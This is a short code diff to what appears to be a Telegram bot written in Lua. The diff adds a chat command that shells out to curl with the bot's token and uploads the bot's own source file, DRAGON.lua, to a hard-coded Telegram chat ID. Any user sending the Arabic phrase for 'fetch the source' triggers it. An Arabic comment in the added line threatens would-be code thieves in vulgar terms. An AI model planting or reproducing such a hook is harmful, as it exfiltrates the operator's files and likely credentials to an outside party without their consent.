@@ -5195,6 +5195,10 @@ end
 end
 end,nil)  
 end
+if text == 'سحب السورس' or text == 'جلب السورس' then 
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هجيبك من طيزك
+send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
+end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
 local Text = [[ 
 ☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑  ☉
